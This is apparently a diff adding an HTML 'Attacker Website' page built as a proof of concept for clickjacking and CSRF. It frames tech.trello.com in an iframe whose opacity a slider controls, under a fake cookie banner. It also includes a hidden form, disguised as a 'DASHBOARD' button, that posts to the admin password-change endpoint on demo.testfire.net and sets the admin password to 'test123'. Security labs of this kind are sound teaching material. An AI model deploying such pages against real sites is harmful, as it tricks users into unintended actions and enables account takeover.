@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attacker Website</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <script src="javascript/main.js"></script>
+    <script>
+    function changeOpacity(val){
+    let myDiv = document.getElementById("myDiv"); 
+    myDiv.style.opacity=val;
+    }
+  </script>
+</head>
+<body>
+    <header>
+        <div class="main">
+            <div class="logo">
+                <img src="images/2.png">
+            </div>
+            <div class="cookies_box" id="cookies_box">
+              <img src="images/3.jpg"> 
+              <h3>Cookies Policy</h3>
+              <p>This site can store cookies on your browser and disclose information in accordance with our cookies policy <a href="#">Learn More</a></p>
+              <button id="activeBtn">Accept</button> 
+            </div>
+            <div class="iframe" id="myDiv">
+                <iframe src="https://tech.trello.com/" frameborder="1"></iframe>
+            </div>
+           <ul>
+               <li class="active"><a href="#">Home</a></li>
+               <li><a href="#">Services</a></li>
+               <li><a href="#">Gallery</a></li>
+               <li><a href="#">About</a></li>
+               <li><a href="#">Contact</a></li>
+           </ul>
+        </div>
+        <div class="title">
+           <h1>WEB CREATIONS</h1>
+        </div>
+        <div class="button">
+           <a href="#" class="btn">WATCH VIDEO</a>
+           <a href="#" class="btn">LEARN MORE</a>
+        </div> 
+        <input type="range" min="1" max="100" value="0" oninput="changeOpacity(this.value/100)"> 
+        <div class="csrf">
+            <form class="open" method="POST" action="https://demo.testfire.net/admin/admin.jsp">
+                <input class="open" type="hidden" name="username" value="admin"/>
+                <input class="open" type="hidden" name="password1" value="test123"/>
+                <input class="open" type="hidden" name="password2" value="test123"/>
+                <input class="open"class="open" type="hidden" name="change" value="Change+Password"/>
+                <input type="submit" value="DASHBOARD">
+            </form>
+        </div>
+    </header>
+</body>
+</html>
